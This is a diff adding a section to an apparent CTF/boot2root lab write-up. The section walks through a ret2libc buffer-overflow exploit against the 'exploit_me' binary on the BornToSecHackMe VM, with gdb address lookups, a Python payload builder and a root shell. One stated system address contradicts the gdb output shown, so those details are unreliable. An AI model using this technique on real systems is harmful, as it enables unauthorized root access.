@@ -278,3 +278,124 @@ The result password is 646da671ca01bb5d84dbb5fb2238dc8e
 
 
 ### explot_me (Zaz)
+
+We will use the ret2libc exploit to use root. All we net to do is SYSSEGV and use system("/bin/sh")
+
+```bash
+__libc_start_main(0x80483f4, 2, 0xbffff7c4, 0x8048440, 0x80484b0 <unfinished ...>
+strcpy(0xbffff6a0, "sdafsdaf")                                    = 0xbffff6a0
+puts("sdafsdaf"sdafsdaf
+)                                                  = 9
++++ exited (status 0) +++
+```
+
+The programs prints first argument on screen using strcpy...
+
+If we pass the string with length bigger then 140 the program will be crash with SYSSEGV
+```
+zaz@BornToSecHackMe:~$ echo $(python -c 'print "A"*140') > pattern
+zaz@BornToSecHackMe:~$ ltrace ./exploit_me $(cat pattern)BB
+__libc_start_main(0x80483f4, 2, 0xbffff744, 0x8048440, 0x80484b0 <unfinished ...>
+strcpy(0xbffff620, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...)                                        = 0xbffff620
+puts("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABB
+)                                                      = 143
+--- SIGSEGV (Segmentation fault) ---
++++ killed by SIGSEGV +++
+```
+
+Then we need to find address of system, /bin/sh/, exit...
+
+```bash
+zaz@BornToSecHackMe:~$ gdb ./exploit_me
+GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
+Copyright (C) 2012 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i686-linux-gnu".
+For bug reporting instructions, please see:
+<http://bugs.launchpad.net/gdb-linaro/>...
+Reading symbols from /home/zaz/exploit_me...(no debugging symbols found)...done.
+(gdb) start
+Temporary breakpoint 1 at 0x80483f7
+Starting program: /home/zaz/exploit_me
+
+Temporary breakpoint 1, 0x080483f7 in main ()
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
+```
+
+System address is 0x080483f7
+
+```bash
+(gdb) find '/bin/sh'
+No symbol table is loaded.  Use the "file" command.
+(gdb) info proc map
+process 2953
+Mapped address spaces:
+
+	Start Addr   End Addr       Size     Offset objfile
+	 0x8048000  0x8049000     0x1000        0x0 /home/zaz/exploit_me
+	 0x8049000  0x804a000     0x1000        0x0 /home/zaz/exploit_me
+	0xb7e2b000 0xb7e2c000     0x1000        0x0
+	0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
+	0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
+	0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
+	0xb7fd2000 0xb7fd5000     0x3000        0x0
+	0xb7fdb000 0xb7fdd000     0x2000        0x0
+	0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
+	0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
+	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
+	0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
+	0xbffdf000 0xc0000000    0x21000        0x0 [stack]
+(gdb) find 0xb7e2c000,0xb7fcf000,"/bin/sh"
+0xb7f8cc58
+1 pattern found.
+```
+
+The /bin/sh address is 0xb7f8cc58
+
+```bash
+(gdb) info function exit
+All functions matching regular expression "exit":
+
+Non-debugging symbols:
+0xb7e5ebe0  exit
+0xb7e5ec10  on_exit
+0xb7e5ee20  __cxa_atexit
+0xb7e5efc0  quick_exit
+0xb7e5eff0  __cxa_at_quick_exit
+0xb7ee41d8  _exit
+0xb7f28500  pthread_exit
+0xb7f2dc10  __cyg_profile_func_exit
+0xb7f4c750  svc_exit
+0xb7f56c80  atexit
+```
+exit address is 0xb7e5ebe0
+
+
+The resul exploit string will be look this JUNK(140 bytes) + system in little endian + 4 bytes + /bin/sh (little endian)
+```python
+buf = ''
+buf += 'A'*140 # junk
+buf += '\x60\xb0\xe6\xb7' # system 0xb7e6b060
+buf += "llll" # 4 bytes
+buf += '\x58\xcc\xf8\xb7' # /bin/sh 0xb7f8cc58
+
+f = open("exploit.txt", "w")
+f.write(buf)
+f.close
+```
+
+```
+zaz@BornToSecHackMe:~$ ./exploit_me $(python exploit.py)
+zaz@BornToSecHackMe:~$ ./exploit_me $(python exploit.py)
+zaz@BornToSecHackMe:~$ ./exploit_me $(cat exploit.
+exploit.py   exploit.txt
+zaz@BornToSecHackMe:~$ ./exploit_me $(cat exploit.txt)
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`��llllX��
+# whoami
+root
+```
+# Done
